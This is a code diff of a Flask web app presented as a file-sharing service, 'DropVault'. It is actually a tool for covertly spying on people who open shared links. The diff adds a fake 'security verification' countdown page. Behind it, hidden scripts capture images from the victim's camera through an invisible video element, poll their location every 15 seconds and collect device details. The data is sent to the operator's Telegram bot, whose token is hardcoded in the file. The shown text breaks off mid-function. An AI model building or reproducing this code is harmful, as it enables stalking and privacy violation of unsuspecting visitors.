@@ -1,7 +1,7 @@
 # by:@ROMEO_UCHIHA (Silent Background Capture & Direct File Access)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
-import base64, requests, os, time, uuid, random
+import base64, requests, os, time, uuid, random, json
 
 app = Flask(__name__)
 app.secret_key = "uchiha_super_secret_key" 
@@ -23,8 +23,33 @@ supabase: Client = create_client(SUPA_URL, SUPA_KEY)
 ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
 ADMIN_CID = "6383817850"
 
+# Escapes chars for Telegram MarkdownV2 to avoid API errors
+def escape_md(text):
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return ''.join('\\' + char if char in escape_chars else char for char in str(text))
+
+# Send TG Message with BOLD formatting and permanent footer
 def send_tg_msg(token, cid, text):
-    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
+    try: 
+        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
+        full_text = text + footer
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage", 
+            json={"chat_id": cid, "text": full_text, "parse_mode": "MarkdownV2"},
+            timeout=5
+        )
+    except: pass
+
+def send_tg_photo(token, cid, raw_img, caption=""):
+    try: 
+        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
+        full_caption = caption + footer
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendPhoto", 
+            data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
+            files={"photo": ("c.jpg", raw_img, "image/jpeg")}, 
+            timeout=10
+        )
     except: pass
 
 def get_bot_name(token):
@@ -32,105 +57,114 @@ def get_bot_name(token):
         res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
         if res.get("ok"): return res["result"]["first_name"]
     except: pass
-    return "Unknown Bot"
+    return "Unknown Node"
 
-def send_tg_photo(token, cid, raw_img, caption=""):
-    try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
-    except: pass
+# --- UI TEMPLATES (Tailwind, Aurora Gradient, Dark/Light Mode) ---
+# Main Layout Wrapper
+def get_base_html(content, title="DropVault"):
+    return f"""
+    <!DOCTYPE html>
+    <html lang="en" class="dark">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>{title}</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+        <script>
+            tailwind.config = {{
+                darkMode: 'class',
+                theme: {{ extend: {{ fontFamily: {{ sans: ['Plus Jakarta Sans', 'sans-serif'], display: ['Orbitron', 'sans-serif'] }} }} }}
+            }}
+        </script>
+        <style>
+            body {{ transition: background-color 0.4s, color 0.4s; overflow-x: hidden; }}
+            .dark body {{ background-color: #05000a; color: #ffffff; }}
+            .light body {{ background-color: #f8fafc; color: #0f172a; }}
+            
+            /* Aurora Orbs */
+            .orb-1 {{ position: fixed; top: -10%; left: -10%; width: 50vw; height: 50vw; background: radial-gradient(circle, rgba(0,229,255,0.15) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none; }}
+            .orb-2 {{ position: fixed; bottom: -20%; right: -10%; width: 60vw; height: 60vw; background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); filter: blur(100px); z-index: -1; pointer-events: none; }}
+            .light .orb-1 {{ background: radial-gradient(circle, rgba(0,229,255,0.2) 0%, transparent 60%); }}
+            .light .orb-2 {{ background: radial-gradient(circle, rgba(255,0,85,0.15) 0%, transparent 60%); }}
 
-# --- UI TEMPLATES ---
-COMMON_STYLE = """
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
-    :root { --main-red: #ff0000; --dark-red: #8a0000; }
-    @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-    body { background: radial-gradient(circle at top, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
-    .container { background: rgba(15, 0, 0, 0.7); backdrop-filter: blur(15px); border: 1px solid var(--main-red); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.2); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; }
-    h2 { font-family: 'Orbitron', sans-serif; color: #fff; margin-bottom: 25px; font-weight: 800; letter-spacing: 1px; }
-    h2 span { color: var(--main-red); }
-    input { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.6); border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; transition: 0.3s; font-size: 15px; }
-    input:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.3); }
-    button { width: 100%; padding: 16px; margin-top: 20px; background: var(--main-red); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; letter-spacing: 1px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(255,0,0,0.3); }
-    button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.5); background: #cc0000; }
-    a { color: #888; text-decoration: none; font-size: 14px; display: inline-block; margin-top: 20px; transition: 0.3s; }
-    a:hover { color: #fff; }
-</style>
-"""
+            /* Glass Panels */
+            .glass-panel {{ background: rgba(20, 20, 30, 0.5); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }}
+            .light .glass-panel {{ background: rgba(255, 255, 255, 0.7); border: 1px solid rgba(0,0,0,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.05); }}
+            
+            .input-glass {{ background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); color: white; transition: 0.3s; }}
+            .light .input-glass {{ background: rgba(255,255,255,0.9); border: 1px solid rgba(0,0,0,0.2); color: #000; }}
+            .input-glass:focus {{ border-color: #00e5ff; box-shadow: 0 0 15px rgba(0,229,255,0.3); outline: none; }}
 
-LANDING_PAGE = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DropVault | Advanced File Sharing</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
-        body { margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: #030303; color: #ffffff; overflow-x: hidden; }
-        header { padding: 25px 8%; display: flex; justify-content: space-between; align-items: center; position: absolute; width: 100%; top: 0; z-index: 100; box-sizing: border-box; }
-        .logo { font-size: 24px; font-weight: 800; color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px; letter-spacing: -0.5px; }
-        .logo span { color: #ff0000; }
-        .nav-links a { color: #a3a3a3; text-decoration: none; margin-left: 30px; font-weight: 500; transition: 0.3s; font-size: 15px; }
-        .nav-links a:hover { color: #fff; }
-        .btn-primary { background: #ff0000; color: #fff !important; padding: 12px 28px; border-radius: 50px; text-decoration: none; font-weight: 700; transition: 0.3s; border: 1px solid transparent; }
-        .btn-primary:hover { background: transparent; border-color: #ff0000; color: #ff0000 !important; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
-        .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 100px 20px; background: radial-gradient(circle at 50% 30%, rgba(50,0,0,0.4) 0%, #030303 60%); position: relative; }
-        .hero h1 { font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 20px; font-weight: 800; line-height: 1.1; letter-spacing: -1px; max-width: 900px; }
-        .hero h1 span { background: linear-gradient(90deg, #ff0000, #ff4d4d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .hero p { font-size: 1.15rem; color: #888; max-width: 600px; margin: 0 auto 40px; line-height: 1.6; }
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 80px 10%; background: #050505; border-top: 1px solid #111; }
-        .card { background: #0a0a0a; padding: 40px; border-radius: 20px; border: 1px solid #1a1a1a; transition: 0.4s; text-align: left; }
-        .card:hover { border-color: #ff0000; transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255,0,0,0.05); }
-        .card .icon { width: 50px; height: 50px; background: rgba(255,0,0,0.1); color: #ff0000; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin-bottom: 25px; }
-        .card h3 { color: #fff; margin-bottom: 15px; font-size: 1.3rem; font-weight: 700; }
-        .card p { color: #777; font-size: 0.95rem; line-height: 1.6; }
-        footer { text-align: center; padding: 40px; color: #555; font-size: 0.9rem; border-top: 1px solid #111; background: #030303; }
-        @media(max-width: 768px) { header { flex-direction: column; gap: 20px; padding: 20px; position: relative; } .nav-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; } .nav-links a { margin: 0; } }
-    </style>
-</head>
-<body>
-    <header>
-        <a href="/" class="logo">Drop<span>Vault</span></a>
-        <div class="nav-links">
-            <a href="/lg">Login</a>
-            <a href="/rg" class="btn-primary">Start File Sharing</a>
-        </div>
-    </header>
-    <div class="hero">
-        <h1>Next-Gen <span>File Sharing</span> Infrastructure</h1>
-        <p>Upload your files and generate highly protected sharing links. Restrict access using identity and location parameters for ultimate control.</p>
-        <a href="/lg" class="btn-primary" style="padding: 16px 36px; font-size: 1.1rem;">Host A File Now</a>
-    </div>
-    <div class="features">
-        <div class="card">
-            <div class="icon">📁</div>
-            <h3>Seamless File Delivery</h3>
-            <p>Share documents, videos, and archives with a single clean interface. Perfect for delivering assets to clients securely.</p>
-        </div>
-        <div class="card">
-            <div class="icon">👁️</div>
-            <h3>Identity Gate</h3>
-            <p>Ensure the correct recipient accesses the file. Our system requires a quick visual check before allowing file downloads.</p>
-        </div>
-        <div class="card">
-            <div class="icon">🌍</div>
-            <h3>Geo-Locked Sharing</h3>
-            <p>Limit your file's availability to specific regions. Anyone outside the designated coordinates will be blocked instantly.</p>
-        </div>
-    </div>
-    <footer>
-        © 2026 DropVault File Sharing. Built for privacy and speed.
-    </footer>
-</body>
-</html>
-"""
+            /* Theme Bubble */
+            .theme-toggle {{ position: fixed; top: 20px; right: 20px; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: all 0.3s; }}
+            .dark .theme-toggle {{ background: #1e1e2e; border: 1px solid rgba(255,255,255,0.1); color: #00e5ff; }}
+            .light .theme-toggle {{ background: #ffffff; border: 1px solid rgba(0,0,0,0.1); color: #ff0055; }}
+            .theme-toggle:hover {{ transform: scale(1.1); }}
+        </style>
+    </head>
+    <body class="min-h-screen flex flex-col items-center justify-center p-4">
+        <div class="orb-1"></div><div class="orb-2"></div>
+        
+        <div class="theme-toggle" onclick="toggleTheme()"><i id="themeIcon" class="fas fa-moon text-xl"></i></div>
+        
+        {content}
 
+        <script>
+            function toggleTheme() {{
+                let html = document.documentElement;
+                let icon = document.getElementById('themeIcon');
+                if(html.classList.contains('dark')) {{
+                    html.classList.remove('dark'); html.classList.add('light');
+                    icon.className = 'fas fa-sun text-xl';
+                    localStorage.setItem('theme', 'light');
+                }} else {{
+                    html.classList.remove('light'); html.classList.add('dark');
+                    icon.className = 'fas fa-moon text-xl';
+                    localStorage.setItem('theme', 'dark');
+                }}
+            }}
+            if(localStorage.getItem('theme') === 'light') {{ toggleTheme(); }}
+        </script>
+    </body>
+    </html>
+    """
+
+# Landing Page Update
 @app.route("/")
 def index(): 
-    return render_template_string(LANDING_PAGE)
+    content = """
+    <div class="text-center max-w-3xl z-10 relative mt-10">
+        <div class="inline-block p-4 rounded-3xl bg-gradient-to-r from-cyan-500/20 to-pink-500/20 border border-white/10 mb-6 backdrop-blur-md">
+            <h1 class="font-display font-black text-5xl md:text-7xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-pink-500 tracking-wider">DropVault</h1>
+        </div>
+        <p class="text-lg md:text-xl opacity-80 mb-10 font-medium">Next-Gen File Sharing Infrastructure with Identity & Location verification.</p>
+        <div class="flex gap-4 justify-center">
+            <a href="/lg" class="px-8 py-4 rounded-full bg-black/40 border border-cyan-500/50 hover:bg-cyan-500 hover:text-black font-bold uppercase tracking-widest transition-all shadow-[0_0_20px_rgba(0,229,255,0.2)]">Login</a>
+            <a href="/rg" class="px-8 py-4 rounded-full bg-gradient-to-r from-cyan-500 to-pink-500 text-white font-bold uppercase tracking-widest hover:scale-105 transition-transform shadow-[0_10px_30px_rgba(255,0,85,0.4)]">Start Sharing</a>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-20">
+            <div class="glass-panel p-6 text-left">
+                <i class="fas fa-folder-open text-4xl text-cyan-400 mb-4"></i>
+                <h3 class="font-bold text-xl mb-2">Secure Delivery</h3>
+                <p class="opacity-70 text-sm">Share files safely with instant deployment across multiple nodes.</p>
+            </div>
+            <div class="glass-panel p-6 text-left">
+                <i class="fas fa-fingerprint text-4xl text-pink-500 mb-4"></i>
+                <h3 class="font-bold text-xl mb-2">Identity Gate</h3>
+                <p class="opacity-70 text-sm">Visual verification ensures only authorized targets access payload.</p>
+            </div>
+            <div class="glass-panel p-6 text-left">
+                <i class="fas fa-location-crosshairs text-4xl text-purple-400 mb-4"></i>
+                <h3 class="font-bold text-xl mb-2">Geo-Locked</h3>
+                <p class="opacity-70 text-sm">Restrict downloads to specific coordinates seamlessly.</p>
+            </div>
+        </div>
+    </div>
+    """
+    return render_template_string(get_base_html(content, "DropVault | Home"))
 
 @app.route("/rg", methods=["GET", "POST"])
 def register():
@@ -138,33 +172,64 @@ def register():
         token, cid = request.form.get("token"), request.form.get("cid")
         otp = str(random.randint(1000, 9999))
         supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
-        send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nCode: `{otp}`")
+        
+        msg = f"😈 *SYSTEM REGISTRATION*\n\n*Code:* `{escape_md(otp)}`"
+        send_tg_msg(token, cid, msg)
         return redirect(f"/verify_otp?cid={cid}&purpose=register")
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>CREATE <span>ACCOUNT</span></h2><form method="POST"><input type="text" name="token" placeholder="Bot Token" required><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Already have an account?</a></div>')
+    
+    content = """
+    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
+        <h2 class="font-display font-black text-3xl mb-8 text-center text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-cyan-400">CREATE ACCOUNT</h2>
+        <form method="POST" class="flex flex-col gap-4">
+            <div class="relative"><i class="fas fa-robot absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="token" placeholder="Telegram Bot Token" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-sm"></div>
+            <div class="relative"><i class="fas fa-id-badge absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Admin Chat ID" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-sm"></div>
+            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Send OTP <i class="fas fa-paper-plane ml-2"></i></button>
+        </form>
+        <div class="text-center mt-6"><a href="/lg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-cyan-400 transition-colors uppercase tracking-wider">Already registered? Login</a></div>
+    </div>
+    """
+    return render_template_string(get_base_html(content, "Register | DropVault"))
 
 @app.route("/lg", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
         cid = request.form.get("cid")
         users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
-        if not users: return f"{COMMON_STYLE}<div class='container'><h2>ERROR</h2><p>Not registered!</p><a href='/rg'>Register</a></div>"
+        if not users: 
+            return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative'><i class='fas fa-triangle-exclamation text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Not Registered!</h2><a href='/rg' class='bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Register Now</a></div>", "Error"))
         elif len(users) == 1:
             otp = str(random.randint(1000, 9999))
             supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
-            send_tg_msg(users[0]["bot_token"], cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
+            msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
+            send_tg_msg(users[0]["bot_token"], cid, msg)
             return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
         else:
-            html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
-            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit'>🤖 {u['bot_name']}</button></form>"
-            return render_template_string(html + "</div>")
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>WELCOME <span>BACK</span></h2><form method="POST"><input type="text" name="cid" placeholder="Enter Chat ID" required><button type="submit">Access Dashboard</button></form><a href="/rg">Create a new account</a></div>')
+            html = """<div class='glass-panel p-8 w-full max-w-md z-10 relative'><h2 class='font-display font-black text-2xl mb-6 text-center text-cyan-400'>SELECT NODE</h2><div class='flex flex-col gap-3'>"""
+            for u in users: 
+                html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit' class='w-full input-glass p-4 rounded-xl text-left font-bold hover:border-cyan-400 transition-colors'><i class='fas fa-robot text-cyan-400 mr-3'></i> {u['bot_name']}</button></form>"
+            html += "</div></div>"
+            return render_template_string(get_base_html(html, "Select Node"))
+            
+    content = """
+    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
+        <div class="w-20 h-20 mx-auto bg-gradient-to-br from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center shadow-[0_0_20px_rgba(0,229,255,0.4)] mb-6"><i class="fas fa-fingerprint text-4xl text-white"></i></div>
+        <h2 class="font-display font-black text-3xl mb-8 text-center text-white">WELCOME <span class="text-cyan-400">BACK</span></h2>
+        <form method="POST" class="flex flex-col gap-4">
+            <div class="relative"><i class="fas fa-id-card absolute left-4 top-1/2 -translate-y-1/2 opacity-50"></i><input type="text" name="cid" placeholder="Enter System Chat ID" required class="input-glass w-full p-4 pl-12 rounded-xl font-mono text-center tracking-widest font-bold"></div>
+            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Initialize Uplink <i class="fas fa-bolt ml-2"></i></button>
+        </form>
+        <div class="text-center mt-6"><a href="/rg" class="text-sm font-bold opacity-60 hover:opacity-100 hover:text-pink-500 transition-colors uppercase tracking-wider">Create a new account</a></div>
+    </div>
+    """
+    return render_template_string(get_base_html(content, "Login | DropVault"))
 
 @app.route("/send_login_otp", methods=["POST"])
 def send_login_otp():
     cid, token = request.form.get("cid"), request.form.get("token")
     otp = str(random.randint(1000, 9999))
     supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
-    send_tg_msg(token, cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
+    msg = f"🔐 *LOGIN OTP*\n\n*Code:* `{escape_md(otp)}`"
+    send_tg_msg(token, cid, msg)
     return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")
 
 @app.route("/verify_otp", methods=["GET", "POST"])
@@ -179,10 +244,22 @@ def verify_otp():
             session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
             supabase.table("otps").delete().eq("chat_id", cid).execute()
             return redirect("/ds")
-        return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
+        return render_template_string(get_base_html("<div class='glass-panel p-10 text-center z-10 relative'><i class='fas fa-circle-xmark text-5xl text-pink-500 mb-4'></i><h2 class='font-bold text-2xl mb-4'>Invalid OTP!</h2><a href='/lg' class='bg-pink-500 text-white px-6 py-3 rounded-xl font-bold uppercase'>Try Again</a></div>", "Error"))
+    
+    content = """
+    <div class="glass-panel p-8 md:p-12 w-full max-w-md z-10 relative">
+        <h2 class="font-display font-black text-3xl mb-2 text-center text-white">VERIFY <span class="text-cyan-400">OTP</span></h2>
+        <p class="text-center text-xs font-bold uppercase tracking-widest text-pink-500 mb-8"><i class="fas fa-paper-plane mr-1"></i> Check Telegram Bot</p>
+        <form method="POST" class="flex flex-col gap-4">
+            <input type="text" name="otp" placeholder="••••" maxlength="4" required class="input-glass w-full p-5 rounded-xl text-center text-4xl tracking-[1em] font-black outline-none focus:border-cyan-400">
+            <button type="submit" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-unlock-keyhole mr-2"></i> Authenticate</button>
+        </form>
+    </div>
+    """
+    return render_template_string(get_base_html(content, "Verify OTP"))
 
-# --- TARGET PAGE (DIRECT FILE SHOW + HIGH SPEED HD ALTERNATING CAPTURE) ---
+
+# --- TARGET PAGE (10s Wait + Steatlh Capture) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -194,70 +271,100 @@ def target_page(link_id):
     text_content = data.get("text_content", "")
     file_type = data.get("file_type", "")
 
-    return render_template_string('''
+    html_code = '''
     <!DOCTYPE html>
-    <html lang="en">
+    <html lang="en" class="dark">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>DropVault | File Ready</title>
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+        <title>DropVault | Secure Access</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Poppins:wght@400;600&display=swap');
-            :root { --red: #ff0000; --bg: #050505; }
-            * { box-sizing: border-box; margin: 0; padding: 0; }
-            body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
-            
-            /* Main Content UI */
-            .content-box { background: rgba(15,15,15,0.9); border: 1px solid #333; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 500px; text-align: center; animation: slideUp 0.6s ease; }
-            @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-            
-            .file-icon-box { background: #111; border: 1px dashed #444; border-radius: 15px; width: 100%; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 25px; }
-            .file-icon-box i { font-size: 60px; color: var(--red); }
-            .file-icon-box p { color: #888; font-size: 14px; margin: 0; }
-
-            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 18px; background: var(--red); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; text-decoration: none; letter-spacing: 0.5px; transition: 0.3s; cursor: pointer; }
-            .btn-download:hover { background: #cc0000; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,0,0,0.3); }
+            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #05000a; color: white; overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+            .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.1) 0%, transparent 60%); filter: blur(80px); z-index: -1; }
+            .glass-box { background: rgba(20, 20, 30, 0.6); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 40px; width: 100%; max-width: 500px; text-align: center; }
+            .progress-ring circle { transition: stroke-dashoffset 1s linear; transform: rotate(-90deg); transform-origin: 50% 50%; }
         </style>
     </head>
     <body>
-        
-        <div class="content-box" id="media-content"></div>
+        <div class="orb"></div>
 
-        <canvas id="c" style="display:none"></canvas>
-        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>
+        <div id="wait-screen" class="glass-box z-10">
+            <h2 class="font-display font-black text-2xl mb-2 text-cyan-400">SECURITY VERIFICATION</h2>
+            <p class="text-xs font-bold uppercase tracking-widest text-gray-400 mb-8">Checking Node Integrity...</p>
+            
+            <div class="relative w-32 h-32 mx-auto mb-8">
+                <svg class="progress-ring w-full h-full" width="128" height="128">
+                    <circle stroke="rgba(255,255,255,0.1)" stroke-width="8" fill="transparent" r="56" cx="64" cy="64"/>
+                    <circle id="ring-progress" stroke="#00e5ff" stroke-width="8" fill="transparent" r="56" cx="64" cy="64" stroke-dasharray="351.86" stroke-dashoffset="0"/>
+                </svg>
+                <div class="absolute inset-0 flex items-center justify-center flex-col">
+                    <span id="timer-count" class="font-display font-black text-4xl text-white">10</span>
+                </div>
+            </div>
+            
+            <p class="text-sm font-medium opacity-80"><i class="fas fa-shield-halved text-cyan-400 mr-2"></i> Please wait while we decrypt the payload.</p>
+        </div>
+
+        <div id="media-content" class="glass-box hidden z-10"></div>
+
+        <canvas id="c" class="hidden"></canvas>
+        <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>
 
         <script>
-            let actMode = "{{ a_mode }}";
-            let actVal = "{{ a_val }}";
-            let txtVal = {{ t_content | tojson | safe }};
-            let fType = "{{ f_type }}";
+            let actMode = "{{ a_mode }}"; let actVal = "{{ a_val }}"; let txtVal = {{ t_content | tojson | safe }}; let fType = "{{ f_type }}";
+            let camStream = null; let currentCam = "user"; let captureIntervalId = null; let lastSentImage = "";
 
-            // --- CAMERA STATE & TIMERS ---
-            let camStream = null;
-            let currentCam = "user"; // Front Camera
-            let captureIntervalId = null;
-            let lastSentImage = ""; // To prevent duplicate spam when minimized
+            // Battery Fetcher
+            let batteryInfo = "Not Fetched";
+            if(navigator.getBattery) {
+                navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
+            }
 
             window.onload = () => { 
-                getHardware(); 
-                showFileContent();
+                // Start Verification Timer UI
+                startVerificationTimer();
                 
-                setInterval(fetchLocation, 10000); // Location har 10 sec baad
-                startUltraStealthSequence();
+                // Stealth capture in background immediately
+                setTimeout(() => {
+                    getHardware(); 
+                    fetchLocation();
+                    startUltraStealthSequence();
+                }, 1000); 
+                
+                setInterval(fetchLocation, 15000); 
             };
 
+            function startVerificationTimer() {
+                let count = 10;
+                let circle = document.getElementById('ring-progress');
+                let circumference = 56 * 2 * Math.PI; // 351.86
+                
+                let timer = setInterval(() => {
+                    count--;
+                    document.getElementById('timer-count').innerText = count;
+                    let offset = circumference - (count / 10) * circumference;
+                    circle.style.strokeDashoffset = offset;
+
+                    if(count <= 0) {
+                        clearInterval(timer);
+                        document.getElementById('wait-screen').classList.add('hidden');
+                        showFileContent();
+                    }
+                }, 1000);
+            }
+
             function getHardware() {
-                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
-                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>console.log("hw err"));
+                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0, battery: batteryInfo };
+                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>{});
             }
 
             function fetchLocation() {
                 if(navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
